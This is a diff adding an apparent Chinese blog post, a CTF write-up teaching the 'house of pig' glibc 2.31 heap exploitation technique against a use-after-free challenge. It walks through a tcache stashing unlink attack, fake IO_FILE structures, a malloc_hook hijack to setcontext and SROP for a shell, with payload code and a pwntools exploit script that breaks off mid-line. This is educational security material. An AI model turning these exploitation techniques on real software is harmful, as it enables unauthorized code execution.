@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/site_logo.ico">
+  <title>通过一道题学习house of pig | Darry's Blog</title>
+  <meta name="author" content="Darry想学二进制" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="heap, pwn, writeup, 新手向" />
+  
+  <meta name="description" content="通过一道题学习house of pig题目附件 题目分析最近看到一个比较有意思的题目，是pwn_RenCvn师傅给的，基本的菜单功能，但是是通过calloc来申请堆块的大小限制在small bin范围内，漏洞也挺明了的，就是uaf，题目使用的是 libc2.31  参考大佬博客：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;242640https:&#x2F;&#x2F;www.anquanke.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过一道题学习house of pig">
+<meta property="og:url" content="http://example.com/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/index.html">
+<meta property="og:site_name" content="Darry&#39;s Blog">
+<meta property="og:description" content="通过一道题学习house of pig题目附件 题目分析最近看到一个比较有意思的题目，是pwn_RenCvn师傅给的，基本的菜单功能，但是是通过calloc来申请堆块的大小限制在small bin范围内，漏洞也挺明了的，就是uaf，题目使用的是 libc2.31  参考大佬博客：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;242640https:&#x2F;&#x2F;www.anquanke.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/site_logo.ico">
+<meta property="article:published_time" content="2021-10-07T14:49:42.000Z">
+<meta property="article:modified_time" content="2021-10-07T15:27:49.553Z">
+<meta property="article:author" content="Darry想学二进制">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="新手向">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/site_logo.ico">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="http://www.darry-long.top">作者博客</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://github.com/Darry-lang1/Darry-lang1.github.io/tree/master">项目链接</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Darry&#39;s Blog</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Darry&#39;s Blog</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        <section class="col-md-8">
+    <article>
+        <div class="kratos-hentry kratos-post-inner clearfix">
+            <header class="kratos-entry-header">
+                
+                    <h1 class="kratos-entry-title text-center">通过一道题学习house of pig</h1>
+                
+                
+                <ul class="kratos-post-meta text-center">
+                    <li><i class="fa fa-calendar"></i> 2021-10-07</li>
+                    <li><i class="fa fa-user"></i> 作者 Darry想学二进制</li>
+                    <li>
+                        <i class="fa fa-edit"></i> 
+                        
+                        
+                            ~6.97K
+                        
+                        字
+                    </li>
+                    
+                </ul>
+            </header>
+            <div class="kratos-post-content">
+                <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                    本文最后编辑于 <time datetime="1633620469553"></time> 前，其中的内容可能需要更新。
+                </div>
+                
+                    <div class="kratos-post-inner-toc">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig"><span class="toc-number">1.</span> <span class="toc-text">通过一道题学习house of pig</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+                    </div>
+                
+                <hr />
+                <h1 id="通过一道题学习house-of-pig"><a href="#通过一道题学习house-of-pig" class="headerlink" title="通过一道题学习house of pig"></a>通过一道题学习house of pig</h1><p><a href="/download/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house_of_pig/%E9%99%84%E4%BB%B6.zip">题目附件</a></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>最近看到一个比较有意思的题目，是pwn_RenCvn师傅给的，基本的菜单功能，但是是通过<code>calloc</code>来申请堆块的大小限制在small bin范围内，漏洞也挺明了的，就是<code>uaf</code>，题目使用的是<code> libc2.31</code></p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211004204211611.png" alt="image-20211004204211611"></p>
+<p>参考大佬博客：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/242640">https://www.anquanke.com/post/id/242640</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/216290">https://www.anquanke.com/post/id/216290</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/198173%EF%BC%8C%E5%9F%BA%E6%9C%AC%E4%B8%8A%E9%83%BD%E6%98%AF%E8%BF%99%E5%87%A0%E7%AF%87%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%95%B4%E5%90%88%E3%80%82">https://www.anquanke.com/post/id/198173，基本上都是这几篇博客的整合。</a></p>
+<p>因为没有large bin范围的chunk申请，所以large bin attack没办法用，我唯一想到可以用的就是<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/198173">tcache_stashing_unlink_attack</a>，可以任意空间写一个大地址。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>执行 Tcache Stashing Unlink Attack</p>
+<p>tcache bin和SmallBin中的情况为：</p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007230819144.png" alt="image-20211007230819144"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Small Bin: Chunk2 -&gt; Chunk1</span><br></pre></td></tr></table></figure>
+
+<p>那么我们接下来若申请一个大小为<code>0xa0</code>的<code>Chunk</code>，程序仅会检查<code>Chunk2</code>的<code>fd</code>指针是否指向<code>Chunk1</code>。在取出<code>Chunk 1</code>后，<strong>因为0xa0的Tcache Bin还有2个空位，程序会首先遍历发现Chunk2满足大小条件并将其作为参数调用<code>tcache_put</code>。</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin) ) != bin)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        bck = tc_victim-&gt;bk;</span><br><span class="line">        ...</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>若此时，我们篡改了<code>Chunk 2</code>的<code>bk</code>指针为<code>Fake_Chunk</code>的地址(_IO_list_all-0x10)，那么程序接下来会将<code>Small bin</code>的<code>bk</code>指针置为<code>_IO_list_all-0x10</code>，并且在<code>_IO_list_all-0x10 -&gt; fd</code>的位置写入<code>bin</code>的地址，也就是<code>main_arena</code>的地址。</p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007231759273.png" alt="image-20211007231759273"></p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007232210057.png" alt="image-20211007232210057"></p>
+<p>通过<code>tcache_stashing_unlink_attack</code>写<code>_IO_list_all</code>为一个<code>main_arena</code>上的一个地址</p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007205137232.png" alt="image-20211007215428051"></p>
+<p>然后在<code>main_arena</code>上对应<code>FILE</code> 结构的<code>_chain</code>字段劫持为堆地址（通过释放对应位置的<code>chunk</code>）</p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007210003145.png" alt="image-20211007215617489"></p>
+<p>后面就是伪造 FILE 结构，最重要的一点就是将<code>IO_file_jumps </code>修改为 <code>_IO_str_jumps</code>,那么当原本应该调用<code> IO_file_overflow</code> 的时候，就会转而调用如下的<code> IO_str_overflow</code>。而该函数是以传入的 FILE 地址本身为参数的，同时其中会连续调用<code> malloc</code>、<code>memcpy</code>、<code>free</code> 函数（如下图）</p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/t012d5dfc2cc6ca71b9.png" alt="img"></p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/t013bff2b8a70730476.png" alt="img"></p>
+<p>然后布置堆块，在<code>0xa0</code>的bin中留下两个堆块</p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007212821967.png" alt="image-20211007215652848"></p>
+<p>其中一个是<code>malloc_hook</code>,然后我们利用<code>io_file</code>的非预期堆块申请申请到<code>malloc_hook</code>同时用非预期填充将<code>malloc_hook</code>填充为<code>setcontext</code>，然后通过布置寄存器，来拿<code>shell</code>。</p>
+<p>然后我们看一下我们的fake IO_FILE_plus</p>
+<p><strong>Fake IO_FILE_plus1(malloc(0x90))</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(heap+<span class="number">0x1930</span>)+p64(<span class="number">0</span>) <span class="comment">#rdx chunk 22</span></span><br><span class="line">payload += p64(heap+<span class="number">0x330</span>)+p64(heap+<span class="number">22</span>+<span class="number">0x330</span>)+p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment">#size 90</span></span><br><span class="line">payload += p64(heap+<span class="number">0xbb0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+<span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> <span class="comment">#chain chunk 14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">48</span></span><br><span class="line">payload += p64(<span class="number">0x1ed560</span>+libc_base)<span class="comment">#_IO_str_jumps</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到第二行的两个地址差22，而通过我们的size计算可以得出<code>size = (0x90-100)/2 = 22</code>,是根据伪代码里的这个得到的：</p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007214104336.png" alt="image-20211007214104336"></p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007213524595.png" alt="image-20211007215734735"></p>
+<p>执行完之后：</p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007215130263.png" alt="image-20211007215817322"></p>
+<p><strong>Fake IO_FILE_plus2(malloc(0x90) &amp;&amp; hijack malloc_hook = setcontext)</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(heap+<span class="number">0x1940</span>)+p64(<span class="number">0</span>) <span class="comment">#rdx 22</span></span><br><span class="line">payload += p64(heap+<span class="number">0x350</span>)+p64(heap+<span class="number">22</span>+<span class="number">0x350</span>)+p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment">#size 90</span></span><br><span class="line">payload += p64(heap+<span class="number">0xf10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+<span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> <span class="comment">#chain 16</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">48</span></span><br><span class="line">payload += p64(<span class="number">0x1ed560</span>+libc_base)<span class="comment">#_IO_str_jumps</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007220645501.png" alt="image-20211007220645501"></p>
+<p>执行完之后：</p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007220907005.png" alt="image-20211007220907005"></p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007220935199.png" alt="image-20211007220935199"></p>
+<p>然后再<code>malloc</code>就劫持到<code>setcontext+61</code>这里了，接下来执行第三个IO_FILE_plus就会触发srop。</p>
+<p><strong>Fake IO_FILE_plus3:(srop)</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(heap+<span class="number">0x1940</span>)+p64(<span class="number">0</span>) <span class="comment">#rdx frame</span></span><br><span class="line">payload += p64(heap+<span class="number">0x370</span>)+p64(heap+<span class="number">22</span>+<span class="number">0x370</span>)+p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment">#size 90</span></span><br><span class="line">payload += p64(heap+<span class="number">0x10c0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+<span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> <span class="comment">#chain 17</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">48</span></span><br><span class="line">payload += p64(<span class="number">0x1ed560</span>+libc_base)<span class="comment">#_IO_str_jumps</span></span><br></pre></td></tr></table></figure>
+
+<p>然后这里有一个小细节。就是在<code>IO_str_overflow</code>里的汇编里</p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007221708924.png" alt="image-20211007221708924"></p>
+<p>可以看到在调用<code>malloc</code>之前的<strong>0x7ffff7e6db65</strong>位置<strong>rdx</strong>被赋值为 <strong>[rdi+0x28]</strong>,而此时的<code>rdi</code>恰好指向我们伪造的<code>IO_FILE_plus</code>的头部，而在<code>glibc2.29</code>的版本上<code>setcontext</code>的利用从以前的<code>rdi</code>变为了<code>rdx</code>，因此我们可以通过这个位置来进行新版下的<code>setcontext</code>,进而实现<strong>srop</strong>,具体做法是利用非预期地址填充将<code>malloc_hook</code>填充为<code>setcontext</code>，这样在我们进入<code>io_str_overflow</code>时首先会将<code>rdx</code>赋值为我们可以控制的地址，然后在后面<code>malloc</code>的时候会触发<code>setcontext</code>，而此时<code>rdx</code>已经可控，因此就可以成功实现<code>srop</code>。</p>
+<p>可以看看调试过程：</p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007222311130.png" alt="image-20211007222311130"></p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007222232223.png" alt="image-20211007222232223"></p>
+<p>成功<code>srop</code></p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007223604611.png" alt="image-20211007223604611"></p>
+<p><img src="/2021/10/07/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-pig/image-20211007224122042.png" alt="image-20211007224122042"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">binary=<span class="string">&#x27;./pwn2&#x27;</span></span><br><span class="line">main_arena = <span class="number">0x1ebb80</span></span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rls = <span class="keyword">lambda</span> n=<span class="number">2</span>**<span class="number">20</span>: io.recvlines(n)</span><br><span class="line">su = <span class="keyword">lambda</span> buf,addr:io.success(buf+<span class="string">&quot;==&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io=process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote()</span><br><span class="line">e=ELF(binary)</span><br><span class="line">libc=e.libc</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">one_gadget = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">index</span>):</span></span><br><span class="line">	ru(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	ru(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line">	ru(<span class="string">&quot;index: &quot;</span>)	</span><br><span class="line">	sl(<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line">	ru(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(index))</span><br><span class="line">	ru(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">	sl(content)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	choice(<span class="number">4</span>)</span><br><span class="line">	ru(<span class="string">&quot;index&quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add(<span class="number">0x90</span>)<span class="comment">#0-7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	free(i+<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - main_arena - <span class="number">96</span></span><br><span class="line">fh = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+libc_base</span><br><span class="line">mh = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+libc_base</span><br><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+libc_base+<span class="number">61</span></span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line"><span class="comment">#_IO_str_jumps=libc.sym[&#x27;_IO_str_jumps&#x27;]+libc_base</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">heap = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x340</span></span><br><span class="line">su(<span class="string">&quot;heap&quot;</span>,heap)</span><br><span class="line">list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]+libc_base</span><br><span class="line">su(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	add(<span class="number">0xa0</span>)<span class="comment">#8-13</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	add(<span class="number">0x1a0</span>)<span class="comment">#14-22</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	free(<span class="number">22</span>-i)</span><br><span class="line">free(<span 